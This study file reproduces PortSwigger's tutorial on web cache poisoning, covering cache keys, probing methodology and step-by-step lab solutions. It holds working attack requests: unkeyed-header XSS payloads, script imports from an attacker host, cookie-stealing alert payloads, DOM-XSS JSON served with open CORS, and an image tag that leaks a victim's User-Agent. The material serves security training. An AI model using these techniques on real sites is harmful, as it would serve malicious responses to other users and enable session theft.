# Original PortSwigger Web Cache Poisoning Content

> Complete source supplied for this module. The other files reorganize and explain this material in a study-friendly manner.

```text
Web cache poisoning
In this section, we'll talk about what web cache poisoning is and what behaviors can lead to web cache poisoning vulnerabilities. We'll also look at some ways of exploiting these vulnerabilities and suggest ways you can reduce your exposure to them.

What is web cache poisoning?
Web cache poisoning is an advanced technique whereby an attacker exploits the behavior of a web server and cache so that a harmful HTTP response is served to other users.

Fundamentally, web cache poisoning involves two phases. First, the attacker must work out how to elicit a response from the back-end server that inadvertently contains some kind of dangerous payload. Once successful, they need to make sure that their response is cached and subsequently served to the intended victims.

A poisoned web cache can potentially be a devastating means of distributing numerous different attacks, exploiting vulnerabilities such as XSS, JavaScript injection, open redirection, and so on.

Web cache poisoning research
This technique was first popularized by our 2018 research paper, "Practical Web Cache Poisoning", and developed further in 2020 with a second research paper, "Web Cache Entanglement: Novel Pathways to Poisoning". If you're interested in a detailed description of how we discovered and exploited these vulnerabilities in the wild, the full write-ups are available on our research page.

Research
Practical Web Cache Poisoning
Web Cache Entanglement: Novel Pathways to Poisoning
How does a web cache work?
To understand how web cache poisoning vulnerabilities arise, it is important to have a basic understanding of how web caches work.

If a server had to send a new response to every single HTTP request separately, this would likely overload the server, resulting in latency issues and a poor user experience, especially during busy periods. Caching is primarily a means of reducing such issues.

The cache sits between the server and the user, where it saves (caches) the responses to particular requests, usually for a fixed amount of time. If another user then sends an equivalent request, the cache simply serves a copy of the cached response directly to the user, without any interaction from the back-end. This greatly eases the load on the server by reducing the number of duplicate requests it has to handle.

Normal cache behavior
Cache keys
When the cache receives an HTTP request, it first has to determine whether there is a cached response that it can serve directly, or whether it has to forward the request for handling by the back-end server. Caches identify equivalent requests by comparing a predefined subset of the request's components, known collectively as the "cache key". Typically, this would contain the request line and Host header. Components of the request that are not included in the cache key are said to be "unkeyed".

If the cache key of an incoming request matches the key of a previous request, then the cache considers them to be equivalent. As a result, it will serve a copy of the cached response that was generated for the original request. This applies to all subsequent requests with the matching cache key, until the cached response expires.

Crucially, the other components of the request are ignored altogether by the cache. We'll explore the impact of this behavior in more detail later.

What is the impact of a web cache poisoning attack?
The impact of web cache poisoning is heavily dependent on two key factors:

What exactly the attacker can successfully get cached
As the poisoned cache is more a means of distribution than a standalone attack, the impact of web cache poisoning is inextricably linked to how harmful the injected payload is. As with most kinds of attack, web cache poisoning can also be used in combination with other attacks to escalate the potential impact even further.
The amount of traffic on the affected page
The poisoned response will only be served to users who visit the affected page while the cache is poisoned. As a result, the impact can range from non-existent to massive depending on whether the page is popular or not. If an attacker managed to poison a cached response on the home page of a major website, for example, the attack could affect thousands of users without any subsequent interaction from the attacker.
Note that the duration of a cache entry doesn't necessarily affect the impact of web cache poisoning. An attack can usually be scripted in such a way that it re-poisons the cache indefinitely.

Constructing a web cache poisoning attack
Generally speaking, constructing a basic web cache poisoning attack involves the following steps

1.Identify and evaluate unkeyed inputs
2.Elicit a harmful response from the back-end server
3.Get the response cached

#Identify and evaluate unkeyed inputs
Any web cache poisoning attack relies on manipulation of unkeyed inputs, such as headers. Web caches ignore unkeyed inputs when deciding whether to serve a cached response to the user. This behavior means that you can use them to inject your payload and elicit a "poisoned" response which, if cached, will be served to all users whose requests have the matching cache key. Therefore, the first step when constructing a web cache poisoning attack is identifying unkeyed inputs that are supported by the server.

You can identify unkeyed inputs manually by adding random inputs to requests and observing whether or not they have an effect on the response. This can be obvious, such as reflecting the input in the response directly, or triggering an entirely different response. However, sometimes the effects are more subtle and require a bit of detective work to figure out. You can use tools such as Burp Comparer to compare the response with and without the injected input, but this still involves a significant amount of manual effort.

Param Miner
Fortunately, you can automate the process of identifying unkeyed inputs by adding the Param Miner extension to Burp from the BApp store. To use Param Miner, you simply right-click on a request that you want to investigate and click "Guess headers". Param Miner then runs in the background, sending requests containing different inputs from its extensive, built-in list of headers. If a request containing one of its injected inputs has an effect on the response, Param Miner logs this in Burp, either in the "Issues" pane if you are using Burp Suite Professional, or in the "Output" tab of the extension ("Extensions" > "Installed" > "Param Miner" > "Output") if you are using Burp Suite Community Edition.

For example, in the following screenshot, Param Miner found an unkeyed header X-Forwarded-Host on the home page of the website:

Param miner
Caution: When testing for unkeyed inputs on a live website, there is a risk of inadvertently causing the cache to serve your generated responses to real users. Therefore, it is important to make sure that your requests all have a unique cache key so that they will only be served to you. To do this, you can manually add a cache buster (such as a unique parameter) to the request line each time you make a request. Alternatively, if you are using Param Miner, there are options for automatically adding a cache buster to every request.

Elicit a harmful response from the back-end server
Once you have identified an unkeyed input, the next step is to evaluate exactly how the website processes it. Understanding this is essential to successfully eliciting a harmful response. If an input is reflected in the response from the server without being properly sanitized, or is used to dynamically generate other data, then this is a potential entry point for web cache poisoning.

Get the response cached
Manipulating inputs to elicit a harmful response is half the battle, but it doesn't achieve much unless you can cause the response to be cached, which can sometimes be tricky.

Whether or not a response gets cached can depend on all kinds of factors, such as the file extension, content type, route, status code, and response headers. You will probably need to devote some time to simply playing around with requests on different pages and studying how the cache behaves. Once you work out how to get a response cached that contains your malicious input, you are ready to deliver the exploit to potential victims.

web cache poisoning
Exploiting web cache poisoning vulnerabilities
This basic process can be used to discover and exploit a variety of different web cache poisoning vulnerabilities.

In some cases, web cache poisoning vulnerabilities arise due to general flaws in the design of caches. Other times, the way in which a cache is implemented by a specific website can introduce unexpected quirks that can be exploited.

In the following sections, we'll outline some of the most common examples of both of these scenarios. We've also provided a number of interactive labs so that you can see some of these vulnerabilities in action and practice exploiting them.


Exploiting cache design flaws
In this section, we'll look more closely at how web cache poisoning vulnerabilities can arise due to general flaws in the design of caches. We'll also demonstrate how these can be exploited.

In short, websites are vulnerable to web cache poisoning if they handle unkeyed input in an unsafe way and allow the subsequent HTTP responses to be cached. This vulnerability can be used as a delivery method for a variety of different attacks.

Using web cache poisoning to deliver an XSS attack
Perhaps the simplest web cache poisoning vulnerability to exploit is when unkeyed input is reflected in a cacheable response without proper sanitization.

For example, consider the following request and response:

GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: innocent-website.co.uk

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" />
Here, the value of the X-Forwarded-Host header is being used to dynamically generate an Open Graph image URL, which is then reflected in the response. Crucially for web cache poisoning, the X-Forwarded-Host header is often unkeyed. In this example, the cache can potentially be poisoned with a response containing a simple XSS payload:

GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
If this response was cached, all users who accessed /en?region=uk would be served this XSS payload. This example simply causes an alert to appear in the victim's browser, but a real attack could potentially steal passwords and hijack user accounts.

Read more
Exploiting cross-site scripting vulnerabilities --get reference from XSS notes


Using web cache poisoning to exploit unsafe handling of resource imports
Some websites use unkeyed headers to dynamically generate URLs for importing resources, such as externally hosted JavaScript files. In this case, if an attacker changes the value of the appropriate header to a domain that they control, they could potentially manipulate the URL to point to their own malicious JavaScript file instead.

If the response containing this malicious URL is cached, the attacker's JavaScript file would be imported and executed in the browser session of any user whose request has a matching cache key.

GET / HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: evil-user.net
User-Agent: Mozilla/5.0 Firefox/57.0

HTTP/1.1 200 OK
<script src="https://evil-user.net/static/analytics.js"></script>


#Lab01 : Lab: Web cache poisoning with an unkeyed header
This lab is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser.

 Hint
ACCESS THE LAB
 Solution
With Burp running, load the website's home page
In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the GET request for the home page and send it to Burp Repeater.
Add a cache-buster query parameter, such as ?cb=1234.
Add the X-Forwarded-Host header with an arbitrary hostname, such as example.com, and send the request.
Observe that the X-Forwarded-Host header has been used to dynamically generate an absolute URL for importing a JavaScript file stored at /resources/js/tracking.js.
Replay the request and observe that the response contains the header X-Cache: hit. This tells us that the response came from the cache.
Go to the exploit server and change the file name to match the path used by the vulnerable response:

/resources/js/tracking.js
In the body, enter the payload alert(document.cookie) and store the exploit.
Open the GET request for the home page in Burp Repeater and remove the cache buster.
Add the following header, remembering to enter your own exploit server ID:

X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Send your malicious request. Keep replaying the request until you see your exploit server URL being reflected in the response and X-Cache: hit in the headers.
To simulate the victim, load the poisoned URL in the browser and make sure that the alert() is triggered. Note that you have to perform this test before the cache expires. The cache on this lab expires every 30 seconds.
If the lab is still not solved, the victim did not access the page while the cache was poisoned. Keep sending the request every few seconds to re-poison the cache until the victim is affected and the lab is solved.



Using web cache poisoning to exploit cookie-handling vulnerabilities
Cookies are often used to dynamically generate content in a response. A common example might be a cookie that indicates the user's preferred language, which is then used to load the corresponding version of the page:

GET /blog/post.php?mobile=1 HTTP/1.1
Host: innocent-website.com
User-Agent: Mozilla/5.0 Firefox/57.0
Cookie: language=pl;
Connection: close
In this example, the Polish version of a blog post is being requested. Notice that the information about which language version to serve is only contained in the Cookie header. Let's suppose that the cache key contains the request line and the Host header, but not the Cookie header. In this case, if the response to this request is cached, then all subsequent users who tried to access this blog post would receive the Polish version as well, regardless of which language they actually selected.

This flawed handling of cookies by the cache can also be exploited using web cache poisoning techniques. In practice, however, this vector is relatively rare in comparison to header-based cache poisoning. When cookie-based cache poisoning vulnerabilities exist, they tend to be identified and resolved quickly because legitimate users have accidentally poisoned the cache.

#Lab02 :Web cache poisoning with an unkeyed cookie
This lab is vulnerable to web cache poisoning because cookies aren't included in the cache key. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes alert(1) in the visitor's browser.

Analysis:
With Burp running, load the website's home page.
In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Notice that the first response you received sets the cookie fehost=prod-cache-01.
Reload the home page and observe that the value from the fehost cookie is reflected inside a double-quoted JavaScript object in the response.
Send this request to Burp Repeater and add a cache-buster query parameter.
Change the value of the cookie to an arbitrary string and resend the request. Confirm that this string is reflected in the response.
Place a suitable XSS payload in the fehost cookie, for example:

fehost=someString"-alert(1)-"someString
Replay the request until you see the payload in the response and X-Cache: hit in the headers.
Load the URL in the browser and confirm the alert() fires.
Go back Burp Repeater, remove the cache buster, and replay the request to keep the cache poisoned until the victim visits the site and the lab is solved.

-------------

#Using multiple headers to exploit web cache poisoning vulnerabilities
Some websites are vulnerable to simple web cache poisoning exploits, as demonstrated above. However, others require more sophisticated attacks and only become vulnerable when an attacker is able to craft a request that manipulates multiple unkeyed inputs.

For example, let's say a website requires secure communication using HTTPS. To enforce this, if a request that uses another protocol is received, the website dynamically generates a redirect to itself that does use HTTPS:

GET /random HTTP/1.1
Host: innocent-site.com
X-Forwarded-Proto: http

HTTP/1.1 301 moved permanently
Location: https://innocent-site.com/random
By itself, this behavior isn't necessarily vulnerable. However, by combining this with what we learned earlier about vulnerabilities in dynamically generated URLs, an attacker could potentially exploit this behavior to generate a cacheable response that redirects users to a malicious URL.


#Lab03 : Lab: Web cache poisoning with multiple headers
This lab contains a web cache poisoning vulnerability that is only exploitable when you use multiple headers to craft a malicious request. A user visits the home page roughly once a minute. To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser.

Solution:

With Burp running, load the website's home page.
Go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the GET request for the JavaScript file /resources/js/tracking.js and send it to Burp Repeater.
Add a cache-buster query parameter and the X-Forwarded-Host header with an arbitrary hostname, such as example.com. Notice that this doesn't seem to have any effect on the response.
Remove the X-Forwarded-Host header and add the X-Forwarded-Scheme header instead. Notice that if you include any value other than HTTPS, you receive a 302 response. The Location header shows that you are being redirected to the same URL that you requested, but using https://.
Add the X-Forwarded-Host: example.com header back to the request, but keep X-Forwarded-Scheme: nothttps as well. Send this request and notice that the Location header of the 302 redirect now points to https://example.com/.
Go to the exploit server and change the file name to match the path used by the vulnerable response:

 /resources/js/tracking.js
In the body, enter the payload alert(document.cookie) and store the exploit.
Go back to the request in Burp Repeater and set the X-Forwarded-Host header as follows, remembering to enter your own exploit server ID:

X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Make sure the X-Forwarded-Scheme header is set to anything other than HTTPS.
Send the request until you see your exploit server URL reflected in the response and X-Cache: hit in the headers.
To check that the response was cached correctly, right-click on the request in Burp, select "Copy URL", and load this URL in Burp's browser. If the cache was successfully poisoned, you will see the script containing your payload, alert(document.cookie). Note that the alert() won't actually execute here.
Go back to Burp Repeater, remove the cache buster, and resend the request until you poison the cache again.
To simulate the victim, reload the home page in the browser and make sure that the alert() fires.
Keep replaying the request to keep the cache poisoned until the victim visits the site and the lab is solved.

-----------------------
#Exploiting responses that expose too much information
Sometimes websites make themselves more vulnerable to web cache poisoning by giving away too much information about themselves and their behavior.

Cache-control directives
One of the challenges when constructing a web cache poisoning attack is ensuring that the harmful response gets cached. This can involve a lot of manual trial and error to study how the cache behaves. However, sometimes responses explicitly reveal some of the information an attacker needs to successfully poison the cache.

One such example is when responses contain information about how often the cache is purged or how old the currently cached response is:

HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Age: 174
Cache-Control: public, max-age=1800
Although this doesn't directly lead to web cache poisoning vulnerabilities, it does save a potential attacker some of the manual effort involved because they know exactly when to send their payload to ensure it gets cached.

This knowledge also enables far more subtle attacks. Rather than bombarding the back-end server with requests until one sticks, which could raise suspicions, the attacker can carefully time a single malicious request to poison the cache.

Vary header
The rudimentary way that the Vary header is often used can also provide attackers with a helping hand. The Vary header specifies a list of additional headers that should be treated as part of the cache key even if they are normally unkeyed. It is commonly used to specify that the User-Agent header is keyed, for example, so that if the mobile version of a website is cached, this won't be served to non-mobile users by mistake.

This information can also be used to construct a multi-step attack to target a specific subset of users. For example, if the attacker knows that the User-Agent header is part of the cache key, by first identifying the user agent of the intended victims, they could tailor the attack so that only users with that user agent are affected. Alternatively, they could work out which user agent was most commonly used to access the site, and tailor the attack to affect the maximum number of users that way

#Lab04 : Targeted web cache poisoning using an unknown header
This lab is vulnerable to web cache poisoning. A victim user will view any comments that you post. To solve this lab, you need to poison the cache with a response that executes alert(document.cookie) in the visitor's browser. However, you also need to make sure that the response is served to the specific subset of users to which the intended victim belongs.

Solution
Solving this lab requires multiple steps. First, you need to identify where the vulnerability is and study how the cache behaves. You then need to find a way of targeting the right subset of users before finally poisoning the cache accordingly.

With Burp running, load the website's home page.
In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the GET request for the home page.
With the Param Miner extension enabled, right-click on the request and select "Guess headers". After a while, Param Miner will report that there is a secret input in the form of the X-Host header.
Send the GET request to Burp Repeater and add a cache-buster query parameter.
Add the X-Host header with an arbitrary hostname, such as example.com. Notice that the value of this header is used to dynamically generate an absolute URL for importing the JavaScript file stored at /resources/js/tracking.js.
Go to the exploit server and change the file name to match the path used by the vulnerable response:

/resources/js/tracking.js
In the body, enter the payload alert(document.cookie) and store the exploit.
Go back to the request in Burp Repeater and set the X-Host header as follows, remembering to add your own exploit server ID:

X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Send the request until you see your exploit server URL reflected in the response and X-Cache: hit in the headers.
To simulate the victim, load the URL in the browser and make sure that the alert() fires.
Notice that the Vary header is used to specify that the User-Agent is part of the cache key. To target the victim, you need to find out their User-Agent.
On the website, notice that the comment feature allows certain HTML tags. Post a comment containing a suitable payload to cause the victim's browser to interact with your exploit server, for example:

<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
Go to the blog page and double-check that your comment was successfully posted.
Go to the exploit server and click the button to open the "Access log". Refresh the page every few seconds until you see requests made by a different user. This is the victim. Copy their User-Agent from the log.
Go back to your malicious request in Burp Repeater and paste the victim's User-Agent into the corresponding header. Remove the cache buster.
Keep sending the request until you see your exploit server URL reflected in the response and X-Cache: hit in the headers.
Replay the request to keep the cache poisoned until the victim visits the site and the lab is solved
-----------------------------------------------------------------------------------

#Using web cache poisoning to exploit DOM-based vulnerabilities
As discussed earlier, if the website unsafely uses unkeyed headers to import files, this can potentially be exploited by an attacker to import a malicious file instead. However, this applies to more than just JavaScript files.

Many websites use JavaScript to fetch and process additional data from the back-end. If a script handles data from the server in an unsafe way, this can potentially lead to all kinds of DOM-based vulnerabilities.

For example, an attacker could poison the cache with a response that imports a JSON file containing the following payload:

{"someProperty" : "<svg onload=alert(1)>"}
If the website then passes the value of this property into a sink that supports dynamic code execution, the payload would be executed in the context of the victim's browser session.

If you use web cache poisoning to make a website load malicious JSON data from your server, you may need to grant the website access to the JSON using CORS:

HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: *

{
    "malicious json" : "malicious json"
}

#Lab05 : Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria
This lab contains a DOM-based vulnerability that can be exploited as part of a web cache poisoning attack. A user visits the home page roughly once a minute. Note that the cache used by this lab has stricter criteria for deciding which responses are cacheable, so you will need to study the cache behavior closely.

To solve the lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser.

ACCESS THE LAB
 Solution
With Burp running, open the website's home page.
In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the GET request for the home page and send it to Burp Repeater.
Use Param Miner to identify that the X-Forwarded-Host header is supported.
Add a cache buster to the request, as well as the X-Forwarded-Host header with an arbitrary hostname, such as example.com. Notice that this header overwrites the data.host variable, which is passed into the initGeoLocate() function.
Study the initGeoLocate() function in /resources/js/geolocate.js and notice that it is vulnerable to DOM-XSS due to the way it handles the incoming JSON data.
Go to the exploit server and change the file name to match the path used by the vulnerable response:

/resources/json/geolocate.json
In the head, add the header Access-Control-Allow-Origin: * to enable CORS
In the body, add a malicious JSON object that matches the one used by the vulnerable website. However, replace the value with a suitable XSS payload, for example:

{
"country": "<img src=1 onerror=alert(document.cookie) />"
}
Store the exploit.
Back in Burp, find the request for the home page and send it to Burp Repeater.
In Burp Repeater, add the following header, remembering to enter your own exploit server ID:

X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Send the request until you see your exploit server URL reflected in the response and X-Cache: hit in the headers.
If this doesn't work, notice that the response contains the Set-Cookie header. Responses containing this header are not cacheable on this site. Reload the home page to generate a new request, which should have a session cookie already set.
Send this new request to Burp Repeater and repeat the steps above until you successfully poison the cache.
To simulate the victim, load the URL in the browser and make sure that the alert() fires.
Replay the request to keep the cache poisoned until the victim visits the site and the lab is solved

-----------------


#Chaining web cache poisoning vulnerabilities
As we saw earlier, sometimes an attacker is only able to elicit a malicious response by crafting a request using multiple headers. But the same is also true of different types of attack. Web cache poisoning sometimes requires the attacker to chain together several of the techniques we've discussed. By chaining together different vulnerabilities, it is often possible to expose additional layers of vulnerability that were initially unexploitable.

#Lab06 : Combining web cache poisoning vulnerabilities
This lab is susceptible to web cache poisoning, but only if you construct a complex exploit chain.

A user visits the home page roughly once a minute and their language is set to English. To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser.

ACCESS THE LAB
 Solution
This lab requires you to poison the cache with multiple malicious responses simultaneously and coordinate this with the victim's browsing behavior.

With Burp running, load the website's home page.
Use Param Miner to identify that the X-Forwarded-Host and X-Original-URL headers are supported.
In Burp Repeater, experiment with the X-Forwarded-Host header and observe that it can be used to import an arbitrary JSON file instead of the translations.json file, which contains translations of UI texts.
Notice that the website is vulnerable to DOM-XSS due to the way the initTranslations() function handles data from the JSON file for all languages except English.
Go to the exploit server and edit the file name to match the path used by the vulnerable website:

/resources/json/translations.json
In the head, add the header Access-Control-Allow-Origin: * to enable CORS.
In the body, add malicious JSON that matches the structure used by the real translation file. Replace the value of one of the translations with a suitable XSS payload, for example:

{
    "en": {
        "name": "English"
    },
    "es": {
        "name": "español",
        "translations": {
            "Return to list": "Volver a la lista",
            "View details": "</a><img src=1 onerror='alert(document.cookie)' />",
            "Description:": "Descripción"
        }
    }
}
For the rest of this solution we will use Spanish to demonstrate the attack. Please note that if you injected your payload into the translation for another language, you will also need to adapt the examples accordingly.
Store the exploit.
In Burp, find a GET request for /?localized=1 that includes the lang cookie for Spanish:

lang=es
Send the request to Burp Repeater. Add a cache buster and the following header, remembering to enter your own exploit server ID:

X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Send the response and confirm that your exploit server is reflected in the response.
To simulate the victim, load the URL in the browser and confirm that the alert() fires.
You have successfully poisoned the cache for the Spanish page, but the target user's language is set to English. As it's not possible to exploit users with their language set to English, you need to find a way to forcibly change their language.
In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Notice that when you change the language on the page to anything other than English, this triggers a redirect, for example, to /setlang/es. The user's selected language is set server side using the lang=es cookie, and the home page is reloaded with the parameter ?localized=1.
Send the GET request for the home page to Burp Repeater and add a cache buster.
Observe that the X-Original-URL can be used to change the path of the request, so you can explicitly set /setlang/es. However, you will find that this response cannot be cached because it contains the Set-Cookie header.
Observe that the home page sometimes uses backslashes as a folder separator. Notice that the server normalizes these to forward slashes using a redirect. Therefore, X-Original-URL: /setlang\es triggers a 302 response that redirects to /setlang/es. Observe that this 302 response is cacheable and, therefore, can be used to force other users to the Spanish version of the home page.
You now need to combine these two exploits. First, poison the GET /?localized=1 page using the X-Forwarded-Host header to import your malicious JSON file from the exploit server.
Now, while the cache is still poisoned, also poison the GET / page using X-Original-URL: /setlang\es to force all users to the Spanish page.
To simulate the victim, load the English page in the browser and make sure that you are redirected and that the alert() fires.
Replay both requests in sequence to keep the cache poisoned on both pages until the victim visits the site and the lab is solved.

----------------------------------------------------------------------

#Exploiting cache implementation flaws
In our previous labs, you learned how to exploit web cache poisoning vulnerabilities by manipulating typical unkeyed inputs, such as HTTP headers and cookies. While this approach is effective, it only scratches the surface of what is possible with web cache poisoning.

In this section, we'll demonstrate how you can access a much greater attack surface for web cache poisoning by exploiting quirks in specific implementations of caching systems. In particular, we'll look at why flaws in how cache keys are generated can sometimes leave websites vulnerable to cache poisoning via separate vulnerabilities that are traditionally considered unexploitable. We'll also show how you can take classic techniques even further to potentially poison application-level caches, often with devastating results.

These techniques were first documented by our Director of Research, James Kettle, for his presentation "Web Cache Entanglement: Novel Pathways to Poisoning" at BlackHat USA 2020. If you're interested in seeing how he was able to discover and exploit these vulnerabilities in the wild, you can access a recording of this presentation, and the accompanying whitepaper, from our research page.

Research
Web Cache Entanglement: Novel Pathways to Poisoning

Cache key flaws
Generally speaking, websites take most of their input from the URL path and the query string. As a result, this is a well-trodden attack surface for various hacking techniques. However, as the request line is usually part of the cache key, these inputs have traditionally not been considered suitable for cache poisoning. Any payload injected via keyed inputs would act as a cache buster, meaning your poisoned cache entry would almost certainly never be served to any other users.

On closer inspection, however, the behavior of individual caching systems is not always as you would expect. In practice, many websites and CDNs perform various transformations on keyed components when they are saved in the cache key. This can include:

Excluding the query string
Filtering out specific query parameters
Normalizing input in keyed components
These transformations may introduce a few unexpected quirks. These are primarily based around discrepancies between the data that is written to the cache key and the data that is passed into the application code, even though it all stems from the same input. These cache key flaws can be exploited to poison the cache via inputs that may initially appear unusable.

In the case of fully integrated, application-level caches, these quirks can be even more extreme. In fact, internal caches can be so unpredictable that it is sometimes difficult to test them at all without inadvertently poisoning the cache for live users.

Cache probing methodology
The methodology of probing for cache implementation flaws differs slightly from the classic web cache poisoning methodology. These newer techniques rely on flaws in the specific implementation and configuration of the cache, which may vary dramatically from site to site. This means that you need a deeper understanding of the target cache and its behavior.

In this section, we'll outline the high-level methodology for probing the cache to understand its behavior and identify any potential flaws. Afterwards, we'll provide some more concrete examples of common cache key flaws and how you can exploit them.

The methodology involves the following steps:

Identify a suitable cache oracle
Probe key handling
Identify an exploitable gadget
Identify a suitable cache oracle
The first step is to identify a suitable "cache oracle" that you can use for testing. A cache oracle is simply a page or endpoint that provides feedback about the cache's behavior. This needs to be cacheable and must indicate in some way whether you received a cached response or a response directly from the server. This feedback could take various forms, such as:

An HTTP header that explicitly tells you whether you got a cache hit
Observable changes to dynamic content
Distinct response times
Ideally, the cache oracle will also reflect the entire URL and at least one query parameter in the response. This will make it easier to notice parsing discrepancies between the cache and the application, which will be useful for constructing different exploits later.

If you can identify that a specific third-party cache is being used, you can also consult the corresponding documentation. This may contain information about how the default cache key is constructed. You might even stumble across some handy tips and tricks, such as features that allow you to see the cache key directly. For example, Akamai-based websites may support the header Pragma: akamai-x-get-cache-key, which you can use to display the cache key in the response headers:

GET /?param=1 HTTP/1.1
Host: innocent-website.com
Pragma: akamai-x-get-cache-key

HTTP/1.1 200 OK
X-Cache-Key: innocent-website.com/?param=1
Probe key handling
The next step is to investigate whether the cache performs any additional processing of your input when generating the cache key. You are looking for an additional attack surface hidden within seemingly keyed components.

You should specifically look at any transformation that is taking place. Is anything being excluded from a keyed component when it is added to the cache key? Common examples are excluding specific query parameters, or even the entire query string, and removing the port from the Host header.

If you're fortunate enough to have direct access to the cache key, you can simply compare the key after injecting different inputs. Otherwise, you can use your understanding of the cache oracle to infer whether you received the correct cached response. For each case that you want to test, you send two similar requests and compare the responses.

Let's say that our hypothetical cache oracle is the target website's home page. This automatically redirects users to a region-specific page. It uses the Host header to dynamically generate the Location header in the response:

GET / HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com/en
Cache-Status: miss
To test whether the port is excluded from the cache key, we first need to request an arbitrary port and make sure that we receive a fresh response from the server that reflects this input:

GET / HTTP/1.1
Host: vulnerable-website.com:1337

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com:1337/en
Cache-Status: miss
Next, we'll send another request, but this time we won't specify a port:

GET / HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com:1337/en
Cache-Status: hit
As you can see, we have been served our cached response even though the Host header in the request does not specify a port. This proves that the port is being excluded from the cache key. Importantly, the full header is still passed into the application code and reflected in the response.

In short, although the Host header is keyed, the way it is transformed by the cache allows us to pass a payload into the application while still preserving a "normal" cache key that will be mapped to other users' requests. This kind of behavior is the key concept behind all of the exploits that we'll discuss in this section.

You can use a similar approach to investigate any other processing of your input by the cache. Is your input being normalized in any way? How is your input stored? Do you notice any anomalies? We'll cover how to answer these questions later using concrete examples.

Identify an exploitable gadget
By now, you should have a relatively solid understanding of how the target website's cache behaves and might have found some interesting flaws in the way the cache key is constructed. The final step is to identify a suitable gadget that you can chain with this cache key flaw. This is an important skill because the severity of any web cache poisoning attack is heavily dependent on the gadget you are able to exploit.

These gadgets will often be classic client-side vulnerabilities, such as reflected XSS and open redirects. By combining these with web cache poisoning, you can massively escalate the severity of these attacks, turning a reflected vulnerability into a stored one. Instead of having to induce a victim to visit a specially crafted URL, your payload will automatically be served to anybody who visits the ordinary, perfectly legitimate URL.

Perhaps even more interestingly, these techniques enable you to exploit a number of unclassified vulnerabilities that are often dismissed as "unexploitable" and left unpatched. This includes the use of dynamic content in resource files, and exploits requiring malformed requests that a browser would never send.

Exploiting cache key flaws
Now that you're familiar with the high-level methodology, let's take a look at some typical cache key flaws and how you might exploit them. We'll cover:

Unkeyed port
Unkeyed query string LABS
Unkeyed query parameters LABS
Cache parameter cloaking LABS
Normalized cache keys LABS
Cache key injection LABS
Internal cache poisoning LABS
Unkeyed port
The Host header is often part of the cache key and, as such, initially seems an unlikely candidate for injecting any kind of payload. However, some caching systems will parse the header and exclude the port from the cache key.

In this case, you can potentially use this header for web cache poisoning. For example, consider the case we saw earlier where a redirect URL was dynamically generated based on the Host header. This might enable you to construct a denial-of-service attack by simply adding an arbitrary port to the request. All users who browsed to the home page would be redirected to a dud port, effectively taking down the home page until the cache expired.

This kind of attack can be escalated further if the website allows you to specify a non-numeric port. You could use this to inject an XSS payload, for example.

Unkeyed query string
Like the Host header, the request line is typically keyed. However, one of the most common cache-key transformations is to exclude the entire query string.

Detecting an unkeyed query string
If the response explicitly tells you whether you got a cache hit or not, this transformation is relatively simple to spot - but what if it doesn't? This has the side-effect of making dynamic pages appear as though they are fully static because it can be hard to know whether you are communicating with the cache or the server.

To identify a dynamic page, you would normally observe how changing a parameter value has an effect on the response. But if the query string is unkeyed, most of the time you would still get a cache hit, and therefore an unchanged response, regardless of any parameters you add. Clearly, this also makes classic cache-buster query parameters redundant.

Fortunately, there are alternative ways of adding a cache buster, such as adding it to a keyed header that doesn't interfere with the application's behavior. Some typical examples include:

Accept-Encoding: gzip, deflate, cachebuster
Accept: */*, text/cachebuster
Cookie: cachebuster=1
Origin: https://cachebuster.vulnerable-website.com
If you use Param Miner, you can also select the options "Add static/dynamic cache buster" and "Include cache busters in headers". It will then automatically add a cache buster to commonly keyed headers in any requests that you send using Burp's manual testing tools.

Another approach is to see whether there are any discrepancies between how the cache and the back-end normalize the path of the request. As the path is almost guaranteed to be keyed, you can sometimes exploit this to issue requests with different keys that still hit the same endpoint. For example, the following entries might all be cached separately but treated as equivalent to GET / on the back-end:

Apache: GET //
Nginx: GET /%2F
PHP: GET /index.php/xyz
.NET GET /(A(xyz)/

This transformation can sometimes mask what would otherwise be glaringly obvious reflected XSS vulnerabilities. If penetration testers or automated scanners only receive cached responses without realizing, it can appear as though there is no reflected XSS on the page.

Exploiting an unkeyed query string
Excluding the query string from the cache key can actually make these reflected XSS vulnerabilities even more severe.

Usually, such an attack would rely on inducing the victim to visit a maliciously crafted URL. However, poisoning the cache via an unkeyed query string would cause the payload to be served to users who visit what would otherwise be a perfectly normal URL. This has the potential to impact a far greater number of victims with no further interaction from the attacker.


#Lab07 : Web cache poisoning via an unkeyed query string
